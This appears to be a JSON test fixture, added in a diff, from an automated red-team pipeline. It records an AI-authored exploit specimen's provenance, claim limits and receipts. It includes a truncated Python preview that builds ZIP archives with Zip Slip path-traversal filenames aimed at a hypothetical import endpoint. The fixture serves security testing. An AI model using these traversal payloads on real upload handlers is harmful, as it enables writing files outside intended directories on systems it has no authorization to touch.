@@ -1,0 +1,408 @@
+{
+  "agentic": true,
+  "battle_id": "battle-004",
+  "claim_boundary": {
+    "may_claim": [
+      "lineage_summary_materialized",
+      "research_receipts_materialized",
+      "candidate_methods_materialized",
+      "exploit_genome_materialized",
+      "provider_execution_attested",
+      "provider_authored_specimen_materialized",
+      "provider_artifact_provenance_validated"
+    ],
+    "must_not_claim": [
+      "compiled",
+      "compile_passed",
+      "runnable",
+      "runtime_success",
+      "target_contact",
+      "exploit_success",
+      "blue_detection",
+      "blue_bypass",
+      "blue_kill",
+      "blue_block",
+      "judge_success",
+      "packet_level_behavior",
+      "memory_promotion"
+    ]
+  },
+  "copy": {
+    "boundary_notice": "This PR3c fixture does not include compilation, execution, target contact, Judge replay, Blue outcomes, packet behavior, or memory promotion.",
+    "headline": "Provider-authored specimen materialized",
+    "status_label": "Code authoring passed",
+    "subhead": "Tau routed a real provider/model and Battle validated the generated specimen's provenance."
+  },
+  "execution_boundary": {
+    "compile_status": "NOT_RUN",
+    "judge_status": "NOT_RUN",
+    "judge_verified_exploits": 0,
+    "memory_promotion": "NOT_RUN",
+    "packet_behavior": "NOT_RUN",
+    "runtime_status": "NOT_RUN",
+    "target_contact": "NOT_RUN"
+  },
+  "fixture_fallback_used": false,
+  "fixture_kind": "pr3c_provider_code_author",
+  "generated_at": "2026-07-10T18:00:00Z",
+  "genome": {
+    "agentic": false,
+    "created_by": "battle_deterministic_method_combiner",
+    "deferred_method_ids": [
+      "child_drop_mitm_and_assembly"
+    ],
+    "inherited_method_ids": [
+      "child_archive_traversal_baseline",
+      "child_archive_path_normalization_variants"
+    ],
+    "provider_live": false,
+    "rationale_summary": "Prefer low-complexity archive traversal baseline before high-complexity inherited branches. Use source-backed path normalization variants only after baseline target contact. Defer MITM staging and assembly payload probes until evidence supports them.",
+    "selected_method_ids": [
+      "child_archive_traversal_baseline",
+      "child_archive_path_normalization_variants"
+    ],
+    "status": "PASS",
+    "strategy": {
+      "negative_filter": "Defer MITM staging and assembly payload probes until evidence supports them.",
+      "primary": "Prefer low-complexity archive traversal baseline before high-complexity inherited branches.",
+      "repair_bias": "Use source-backed path normalization variants only after baseline target contact."
+    }
+  },
+  "live": "tau_provider_artifact_authoring",
+  "mocked": false,
+  "node_status": {
+    "exploit-code-author": "PASS",
+    "lineage-summarizer": "PASS",
+    "method-combiner": "PASS",
+    "research-scout": "PASS"
+  },
+  "node_verdict": {
+    "exploit-code-author": "PASS",
+    "lineage-summarizer": "PASS",
+    "method-combiner": "PASS",
+    "research-scout": "PASS"
+  },
+  "proof_mode": "live_tau_child_dag_canary",
+  "provenance": {
+    "command_loop_paths_exposed": false,
+    "credentials_exposed": false,
+    "normalizer_schema": "battle.normalized_synthesis_fixture_builder.v1",
+    "provider_workspace_paths_exposed": false,
+    "raw_paths_redacted": true,
+    "source_receipt_count": 10,
+    "source_run_label": "live_tau_child_dag_canary",
+    "tau_runtime_paths_exposed": false
+  },
+  "provider_authorship": {
+    "agentic": true,
+    "authored_by": "tau_provider",
+    "claim_boundary_passed": true,
+    "code_bytes": 5768,
+    "code_sha256": "sha256:259e46eaca0188f35da5f6b8feaba002e4becfd8298e2f80e0440e580c0a81f6",
+    "goal_hash_bound": true,
+    "observed_model": "opencode-go/kimi-k2.6",
+    "observed_provider": "opencode-go",
+    "output_declared_by_worker": true,
+    "output_hash_bound": true,
+    "output_inside_allowed_root": true,
+    "private_reference_scan_passed": true,
+    "provider_live": true,
+    "provider_route_bound": true,
+    "provider_route_match": true,
+    "provider_run_id_present": true,
+    "provider_run_ref_sha256": "sha256:d90297948e0fe269ae14cf9391af0f13180c50d7a9ffdbabe7d3c538a3f24464",
+    "provider_session_id_present": true,
+    "requested_model": null,
+    "requested_provider": "scillm",
+    "status": "PASS"
+  },
+  "provider_live": true,
+  "receipt_refs": [
+    {
+      "id": "live_tau_child_dag_canary",
+      "label": "live-tau-child-dag-canary-receipt.json",
+      "schema": "battle.live_tau_child_dag_canary_receipt.v1",
+      "sha256": "sha256:396ff188003fb0102b579fce7708d5ca9b9bf2c46224c5237367139e89240c70",
+      "status": "BLOCKED",
+      "verdict": "unexpected_edge"
+    },
+    {
+      "id": "tau_dag_receipt",
+      "label": "dag-receipt.json",
+      "schema": "tau.dag_receipt.v1",
+      "sha256": "sha256:07775d21a83bd7eb7934f03565d34d9f5c064d3480b4ca7f08ee123440ae5b72",
+      "status": "BLOCKED",
+      "verdict": "UNEXPECTED_EDGE"
+    },
+    {
+      "id": "lineage-summarizer_node",
+      "label": "lineage-summarizer-node-receipt.json",
+      "schema": "battle.child_dag_node_receipt.v1",
+      "sha256": "sha256:d8c2519d86339fdcb41321e39610c68390312aa9c3a040cb860bfdbdae4038da",
+      "status": "PASS",
+      "verdict": "PASS"
+    },
+    {
+      "id": "research-scout_node",
+      "label": "research-scout-node-receipt.json",
+      "schema": "battle.child_dag_node_receipt.v1",
+      "sha256": "sha256:8a205da125f57302226f0e8b90e85d7a033e5afc999729934d0c9a341153774c",
+      "status": "PASS",
+      "verdict": "PASS"
+    },
+    {
+      "id": "method-combiner_node",
+      "label": "method-combiner-node-receipt.json",
+      "schema": "battle.child_dag_node_receipt.v1",
+      "sha256": "sha256:36093e35895955d15f7ba9bc97a98099c52d5d1b8dea9b4f15f1e5dd9bfa3be5",
+      "status": "PASS",
+      "verdict": "PASS"
+    },
+    {
+      "id": "exploit-code-author_node",
+      "label": "exploit-code-author-node-receipt.json",
+      "schema": "battle.child_dag_node_receipt.v1",
+      "sha256": "sha256:ec5676f26d6b1da9de127fd7973fc2615db55774523a7fdc8636f2a25291a01f",
+      "status": "PASS",
+      "verdict": "PASS"
+    },
+    {
+      "id": "provider_authorship",
+      "label": "provider-authorship-receipt.json",
+      "schema": "battle.provider_authorship_receipt.v1",
+      "sha256": "sha256:f5afdf8af0ddd3bf61c4a230ff6cc7f99e3f424bddeb179db76c9730c3c63f4d",
+      "status": "PASS",
+      "verdict": null
+    },
+    {
+      "id": "provider_code_author_boundary",
+      "label": "provider-code-author-boundary-receipt.json",
+      "schema": "battle.provider_code_author_boundary_receipt.v1",
+      "sha256": "sha256:ae07cb46f6be3405af7faecfa3908a6c372043cfda851fe4e861b9d4006d177a",
+      "status": "PASS",
+      "verdict": null
+    },
+    {
+      "id": "provider_artifact_validation",
+      "label": "provider-artifact-validation.json",
+      "schema": "battle.provider_artifact_validation.v1",
+      "sha256": "sha256:8ea13db866c217016f217b11bf0b40b6a0656506ece4cf9af82528525991ab5a",
+      "status": "PASS",
+      "verdict": null
+    },
+    {
+      "id": "specimen",
+      "label": "specimen.json",
+      "schema": "battle.exploit_specimen.v2",
+      "sha256": "sha256:741b770e91f11d4418060a6abc996452adb4cbc3c50d591a3c663785c102f0d9",
+      "status": null,
+      "verdict": null
+    }
+  ],
+  "research": {
+    "external_tool_called": false,
+    "method": "manual",
+    "provider_live": false,
+    "review_required": true,
+    "source_count": 3,
+    "sources": [
+      {
+        "limitations": [
+          "Research is not proof of exploitability.",
+          "Research does not prove the method applies to this target.",
+          "Research is design input, not exploit proof."
+        ],
+        "public_url": "https://security.snyk.io/research/zip-slip-vulnerability",
+        "relevance": "HIGH",
+        "source_id": "source-001",
+        "source_type": "web",
+        "title": "Zip Slip Vulnerability - Snyk Security Database",
+        "usable_facts": [
+          "Zip Slip is an archive extraction directory traversal pattern.",
+          "Traversal filenames can write outside the intended extraction directory."
+        ],
+        "used_for": [
+          "candidate_method",
+          "negative_evidence"
+        ]
+      },
+      {
+        "limitations": [
+          "Research is not proof of exploitability.",
+          "Research does not prove the method applies to this target.",
+          "Research is design input, not exploit proof."
+        ],
+        "public_url": "https://docs.python.org/3/library/zipfile.html",
+        "relevance": "HIGH",
+        "source_id": "source-002",
+        "source_type": "web",
+        "title": "zipfile - Work with ZIP archives - Python documentation",
+        "usable_facts": [
+          "Python archive path handling requires filename validation for unsafe member paths in some APIs.",
+          "Absolute paths and parent-directory components are relevant archive path risks."
+        ],
+        "used_for": [
+          "candidate_method",
+          "compile_repair_policy"
+        ]
+      },
+      {
+        "limitations": [
+          "Research is not proof of exploitability.",
+          "Research does not prove the method applies to this target.",
+          "Research is design input, not exploit proof."
+        ],
+        "public_url": "https://github.com/snyk/zip-slip-vulnerability",
+        "relevance": "MEDIUM",
+        "source_id": "source-003",
+        "source_type": "web",
+        "title": "snyk/zip-slip-vulnerability examples",
+        "usable_facts": [
+          "Public examples classify traversal filenames as the essential Zip Slip payload shape.",
+          "Archive formats and language APIs vary, so implementation-specific validation remains required."
+        ],
+        "used_for": [
+          "negative_evidence"
+        ]
+      }
+    ],
+    "status": "PASS"
+  },
+  "run_id": "battle-004-pr3c-synthesis",
+  "schema": "battle.normalized_synthesis_fixture.v1",
+  "source_run": {
+    "overall_reason": "unexpected_edge",
+    "overall_status": "BLOCKED",
+    "proof_mode": "live_tau_child_dag_canary",
+    "tau_receipt_status": "BLOCKED",
+    "tau_receipt_verdict": "UNEXPECTED_EDGE"
+  },
+  "specimen": {
+    "agentic": true,
+    "child_lane_id": "payload-857-child-dag-001",
+    "code_artifact_label": "exploit_specimen.py",
+    "code_bytes": 5768,
+    "code_preview": {
+      "available": true,
+      "line_count_total": 159,
+      "lines": [
+        "#!/usr/bin/env python3",
+        "\"\"\"",
+        "Exploit specimen candidate \u2014 child archive path traversal baseline",
+        "Battle ID: battle-004",
+        "Child lane: payload-857-child-dag-001",
+        "Node: exploit-code-author",
+        "",
+        "DISCLAIMER: This is a speculative, unverified specimen generated for the Battle",
+        "child DAG. It has NOT been compiled, executed, or validated against any target.",
+        "It does NOT prove exploit success, target contact, Blue bypass, Blue detection,",
+        "or Judge verification.",
+        "",
+        "Method basis:",
+        "  - child_archive_traversal_baseline (filesystem_path)",
+        "  - child_archive_path_normalization_variants (encoding_variant)",
+        "",
+        "Research basis (public sources):",
+        "  - Snyk Zip Slip research: traversal filenames in archives can write outside",
+        "    the intended extraction directory.",
+        "  - Python zipfile documentation: absolute paths and parent-directory refs",
+        "    are relevant archive path risks.",
+        "  - Public zip-slip examples classify traversal filenames as the essential",
+        "    payload shape.",
+        "",
+        "This specimen constructs a malformed ZIP archive containing entries with",
+        "path-traversal filenames, intended for hypothetical /api/import-zip handling.",
+        "\"\"\"",
+        "",
+        "import io",
+        "import zipfile",
+        "import argparse",
+        "import os",
+        "",
+        "",
+        "class ArchiveTraversalSpecimen:",
+        "    \"\"\"Candidate payload builder for archive path traversal baseline.\"\"\"",
+        "",
+        "    # Candidate traversal patterns drawn from public Zip Slip research.",
+        "    # These are speculative shapes; applicability to a specific target is unproven.",
+        "    TRAVERSAL_VARIANTS = [",
+        "        \"../../..[redacted-path-marker]child_specimen.txt\",",
+        "        \"..\\\\..\\\\..\\\\windows\\\\temp\\\\child_specimen.txt\",",
+        "        \"....//....//..../[redacted-path-marker]child_specimen.txt\",",
+        "        \"..%2f..%2f..%2ftmp%2fchild_specimen.txt\",",
+        "    ]",
+        "",
+        "    def __init__(self, target_filename: str = \"child_specimen.txt\"):",
+        "        self.target_filename = target_filename",
+        "",
+        "    def build_traversal_payload(self, variant_index: int = 0) -> bytes:",
+        "        \"\"\"Build a ZIP-shaped payload with a traversal filename entry.",
+        "",
+        "        Args:",
+        "            variant_index: Index into TRAVERSAL_VARIANTS to select a shape.",
+        "",
+        "        Returns:",
+        "            Bytes of a ZIP archive containing one file entry with a traversal",
+        "            filename. This is NOT proven to bypass any target validation.",
+        "        \"\"\"",
+        "        buf = io.BytesIO()",
+        "        with zipfile.ZipFile(buf, \"w\", zipfile.ZIP_DEFLATED) as zf:",
+        "            traversal_name = self.TRAVERSAL_VARIANTS[",
+        "                variant_index % len(self.TRAVERSAL_VARIANTS)",
+        "            ]",
+        "            # Content is a benign marker; real payload staging is unverified.",
+        "            content = b\"BATTLE-004 CHILD SPECIMEN \u2014 UNVERIFIED\"",
+        "            zf.writestr(traversal_name, content)",
+        "        return buf.getvalue()",
+        "",
+        "    def build_normalization_variant_payload(self) -> bytes:",
+        "        \"\"\"Build a ZIP payload mixing path-separator normalization ideas.",
+        "",
+        "        Some archive handling APIs normalize backslashes to forward slashes",
+        "        or vice versa; this mixes separator styles per the",
+        "        child_archive_path_normalization_variants method.",
+        "",
+        "        Returns:",
+        "            Bytes of a ZIP archive with mixed-separator traversal entries.",
+        "        \"\"\"",
+        "        buf = io.BytesIO()"
+      ],
+      "max_bytes": 16384,
+      "max_lines": 80,
+      "preview_sha256": "sha256:130baa1c9cf9b0b915cc63c6e00e5add3b0749867ddddfb0311e8256dbc9c2fc",
+      "redacted": true,
+      "redaction_reasons": [
+        "path_marker"
+      ],
+      "truncated": true
+    },
+    "code_sha256": "sha256:259e46eaca0188f35da5f6b8feaba002e4becfd8298e2f80e0440e580c0a81f6",
+    "created_by": "tau_provider",
+    "generation": 1,
+    "inherited_method_ids": [],
+    "language": "python",
+    "provider_live": true,
+    "schema": "battle.exploit_specimen.v2",
+    "selected_method_ids": [
+      "child_archive_traversal_baseline",
+      "child_archive_path_normalization_variants"
+    ],
+    "specimen_id": "payload-857-child-dag-001-provider-specimen-0001"
+  },
+  "stage_scope": {
+    "downstream_receipts_ignored": true,
+    "excluded_nodes": [
+      "compile-repair",
+      "artifact-reviewer",
+      "battle-handoff-writer"
+    ],
+    "included_nodes": [
+      "lineage-summarizer",
+      "research-scout",
+      "method-combiner",
+      "exploit-code-author"
+    ],
+    "included_through": "exploit-code-author"
+  },
+  "status": "PASS"
+}
